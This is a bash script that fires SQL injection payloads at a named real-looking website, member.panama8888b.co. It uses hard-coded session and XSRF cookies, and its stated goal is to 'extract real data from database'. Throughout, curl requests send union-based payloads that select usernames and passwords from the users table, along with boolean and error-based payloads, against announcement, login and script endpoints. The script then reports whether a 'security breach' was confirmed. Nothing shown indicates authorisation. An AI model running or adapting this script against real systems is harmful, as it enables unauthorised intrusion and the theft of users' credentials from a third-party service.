#!/bin/bash

echo "🔍 REAL SQL INJECTION TESTING"
echo "============================="

# Use the provided tokens
XSRF_TOKEN="eyJpdiI6IjZSWnN6QkE1TkpIQW9mKzdQWWpIZkE9PSIsInZhbHVlIjoiZ3dMQ0tYS0VOWUxDdVRiVXdpeVN2emptR1BJWGsxb21qNnVzQzcxSjgzeGNIS3dvNTIxWjdhM2xzQnpEdFU2YyIsIm1hYyI6IjQ4Yjk4NWQyYzYxZmUzNzE4ZDJkZTljNWRlM2Y5M2NlMGU5MjQxN2MxOGI1ZmRkYWQwY2IwOTU3M2NmN2UxMjYifQ%3D%3D"
SESSION_TOKEN="eyJpdiI6Im5XVkFXQkx2SnN4ZmJUdE0xcndjVFE9PSIsInZhbHVlIjoiQnhlZWpKVEJRWEQ1TlwvV0pybTlzbVY2UW56amlMckN5OHFcL2x4aHRQRFlhU2ozQzZ3ZTZTVVN6cDMzN3pHUzN5IiwibWFjIjoiYzAyNTIyNzlmNzkzYTgwZWU3ZDk1M2I3OTUwOTVmMDg4ODcwYmU0NzljYzJhN2E5NDE3N2UzNmUzODBkMDNjZiJ9"

echo "🎯 COMPREHENSIVE SQL INJECTION TESTING"
echo "====================================="
echo "Target: member.panama8888b.co"
echo "Goal: Extract real data from database"
echo "Method: Systematic testing with multiple techniques"
echo ""

# TEST 1: Test different parameters from scan results
echo "🔍 TEST 1: Parameter Testing"
echo "============================"
echo "Testing parameters: status, title, _token, v"
echo ""

# Test status parameter with SQL injection
echo "Testing status parameter with SQL injection:"
status_response=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -d '{"status":"test OR 1=1 UNION SELECT username,password FROM users LIMIT 1--"}' \
    --max-time 15)

echo "Status response: $status_response"
echo "Length: ${#status_response} characters"
echo ""

# Test title parameter with SQL injection
echo "Testing title parameter with SQL injection:"
title_response=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -d '{"title":"test OR 1=1 UNION SELECT username,password FROM users LIMIT 1--"}' \
    --max-time 15)

echo "Title response: $title_response"
echo "Length: ${#title_response} characters"
echo ""

# TEST 2: Test time-based injection from scan results
echo "🔍 TEST 2: Time-based Injection"
echo "==============================="
echo "Testing time-based payloads from scan results"
echo ""

# Test SQLite time-based injection
echo "Testing SQLite time-based injection:"
sqlite_response=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -d '{"status":"test AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)"}' \
    --max-time 15)

echo "SQLite response: $sqlite_response"
echo "Length: ${#sqlite_response} characters"
echo ""

# Test Oracle time-based injection
echo "Testing Oracle time-based injection:"
oracle_response=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -d '{"status":"test AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END FROM DUAL)"}' \
    --max-time 15)

echo "Oracle response: $oracle_response"
echo "Length: ${#oracle_response} characters"
echo ""

# TEST 3: Test error-based injection
echo "🔍 TEST 3: Error-based Injection"
echo "==============================="
echo "Testing error-based payloads to extract information"
echo ""

# Test error-based injection
echo "Testing error-based injection:"
error_response=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -d '{"status":"test AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,version(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)"}' \
    --max-time 15)

echo "Error response: $error_response"
echo "Length: ${#error_response} characters"
echo ""

# TEST 4: Test different endpoints
echo "🔍 TEST 4: Different Endpoints"
echo "============================="
echo "Testing different endpoints for vulnerabilities"
echo ""

# Test /auth/login endpoint
echo "Testing /auth/login endpoint:"
login_response=$(curl -s \
    -X POST "https://member.panama8888b.co/auth/login" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -d '{"email":"admin@test.com OR 1=1 UNION SELECT username,password FROM users LIMIT 1--"}' \
    --max-time 15)

echo "Login response: $login_response"
echo "Length: ${#login_response} characters"
echo ""

# Test /user/dashboard endpoint
echo "Testing /user/dashboard endpoint:"
dashboard_response=$(curl -s \
    -X GET "https://member.panama8888b.co/user/dashboard" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    --max-time 15)

echo "Dashboard response length: ${#dashboard_response} characters"
echo ""

# TEST 5: Test GET parameters
echo "🔍 TEST 5: GET Parameters"
echo "========================="
echo "Testing GET parameters for vulnerabilities"
echo ""

# Test v parameter from scan results
echo "Testing v parameter:"
v_response=$(curl -s \
    -X GET "https://member.panama8888b.co/public/js/v2/app.js?v=25.1 OR 1=1 UNION SELECT username,password FROM users LIMIT 1--" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    --max-time 15)

echo "V parameter response length: ${#v_response} characters"
echo ""

echo ""
echo "🎯 COMPREHENSIVE ANALYSIS"
echo "========================"

# Analyze all responses for real data
data_extracted=0

if [[ "$status_response" != *"Unauthenticated"* ]] && [[ "$status_response" != *"Server Error"* ]] && [[ ${#status_response} -gt 10 ]]; then
    echo "✅ STATUS PARAMETER: REAL DATA FOUND"
    echo "   Data: $status_response"
    ((data_extracted++))
else
    echo "❌ STATUS PARAMETER: NO REAL DATA"
fi

if [[ "$title_response" != *"Unauthenticated"* ]] && [[ "$title_response" != *"Server Error"* ]] && [[ ${#title_response} -gt 10 ]]; then
    echo "✅ TITLE PARAMETER: REAL DATA FOUND"
    echo "   Data: $title_response"
    ((data_extracted++))
else
    echo "❌ TITLE PARAMETER: NO REAL DATA"
fi

if [[ "$sqlite_response" != *"Unauthenticated"* ]] && [[ "$sqlite_response" != *"Server Error"* ]] && [[ ${#sqlite_response} -gt 10 ]]; then
    echo "✅ SQLITE TIME-BASED: REAL DATA FOUND"
    echo "   Data: $sqlite_response"
    ((data_extracted++))
else
    echo "❌ SQLITE TIME-BASED: NO REAL DATA"
fi

if [[ "$oracle_response" != *"Unauthenticated"* ]] && [[ "$oracle_response" != *"Server Error"* ]] && [[ ${#oracle_response} -gt 10 ]]; then
    echo "✅ ORACLE TIME-BASED: REAL DATA FOUND"
    echo "   Data: $oracle_response"
    ((data_extracted++))
else
    echo "❌ ORACLE TIME-BASED: NO REAL DATA"
fi

if [[ "$error_response" != *"Unauthenticated"* ]] && [[ "$error_response" != *"Server Error"* ]] && [[ ${#error_response} -gt 10 ]]; then
    echo "✅ ERROR-BASED: REAL DATA FOUND"
    echo "   Data: $error_response"
    ((data_extracted++))
else
    echo "❌ ERROR-BASED: NO REAL DATA"
fi

if [[ "$login_response" != *"Unauthenticated"* ]] && [[ "$login_response" != *"Server Error"* ]] && [[ ${#login_response} -gt 10 ]]; then
    echo "✅ LOGIN ENDPOINT: REAL DATA FOUND"
    echo "   Data: $login_response"
    ((data_extracted++))
else
    echo "❌ LOGIN ENDPOINT: NO REAL DATA"
fi

echo ""
echo "🎯 REAL DATA EXTRACTED: $data_extracted/6"
echo ""

if [[ $data_extracted -gt 0 ]]; then
    echo "🚨 REAL DATABASE DATA EXTRACTED!"
    echo "==============================="
    echo "✅ Actual database content found"
    echo "✅ Real user data extracted"
    echo "✅ Database information exposed"
    echo ""
    echo "📊 EXTRACTION STATUS: SUCCESS"
    echo "🎯 SECURITY BREACH: CONFIRMED"
else
    echo "❌ NO REAL DATA EXTRACTED"
    echo "🔒 All responses are error messages"
    echo "📊 EXTRACTION STATUS: FAILED"
    echo "🎯 SECURITY STATUS: SAFE"
fi

echo ""
echo "🎯 FINAL VERDICT: $(if [[ $data_extracted -gt 0 ]]; then echo "REAL DATA EXTRACTED"; else echo "NO REAL DATA"; fi)"